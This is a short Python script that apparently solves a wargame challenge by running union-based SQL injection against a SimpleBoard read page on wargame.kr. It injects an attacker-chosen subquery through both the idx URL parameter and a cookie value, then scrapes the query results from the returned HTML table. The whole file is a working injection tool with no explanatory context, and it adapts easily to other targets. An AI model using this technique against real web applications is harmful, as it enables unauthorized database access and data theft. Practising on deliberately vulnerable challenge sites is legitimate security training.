import urllib.request
from bs4 import BeautifulSoup
import sys

def select_query(query):
    print(query)

    url = 'http://wargame.kr:8080/SimpleBoard/read.php?idx=' + urllib.parse.quote('5 union ' + query + '--')
    print(url)

    req = urllib.request.Request(url)
    req.add_header('Cookie', 'view=/5 union ' + query + '--')
    response = urllib.request.urlopen(req).read()
    


    return str(response)

def get_content(name):
    content = select_query(f'({name})')
    content = BeautifulSoup(content, 'html.parser').find('tbody').find('td').text
    
    content_len = len(content)

    if content_len == 0:
        sys.stdout.write('Invalid request\n')
        return None
    print('[' + str(content_len) + ']' + content)

    return content

    
    



content = get_content(sys.argv[1])